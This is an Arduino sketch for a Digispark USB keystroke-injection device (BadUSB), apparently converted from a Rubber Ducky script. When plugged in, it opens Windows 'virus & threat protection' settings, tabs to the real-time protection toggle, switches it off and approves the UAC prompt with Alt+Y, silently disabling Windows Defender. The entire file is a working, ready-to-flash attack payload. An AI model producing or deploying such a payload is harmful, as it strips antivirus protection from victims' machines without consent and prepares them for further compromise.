// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(41,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("virus & threat protection");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
    DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  for(;;){ /*empty*/ }
}
